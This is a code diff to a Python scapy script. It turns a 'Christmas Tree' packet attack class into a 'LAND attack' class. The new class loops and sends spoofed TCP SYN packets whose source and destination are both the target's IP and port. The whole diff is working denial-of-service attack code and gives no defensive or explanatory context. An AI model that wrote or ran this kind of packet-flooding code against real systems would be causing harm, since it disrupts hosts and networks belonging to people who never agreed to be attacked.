@@ -1,23 +1,22 @@
 from scapy.layers.inet import *
 from scapy.all import *
-import initialize as random_ip
 
 host_name = socket.gethostname()
 host_ip = socket.gethostbyname(host_name)
 
 
-class ChristmasTreeAttack:
+class LandAttack:
     def __init__(self, dst_ip, dst_port):
         self.dst_ip = dst_ip
         self.dst_port = dst_port
         self.sending = True
         self.cta_count = 0
-        self.data = "Christmas Tree ATTACK !!!"
+        self.data = "LAND ATTACK !!!"
 
-    def christmas_tree_attack(self, count):
+    def land_attack(self, count):
         while self.sending:
-            L3 = IP(src=random_ip.random_ip(), dst=self.dst_ip)
-            L4 = TCP(flags='FUP', sport=RandShort())
+            L3 = IP(src=self.dst_ip, dst=self.dst_ip)
+            L4 = TCP(flags='S', sport=self.dst_port)
             L5 = Raw(load=self.data)
             pkt = L3 / L4 / L5
             send(pkt)
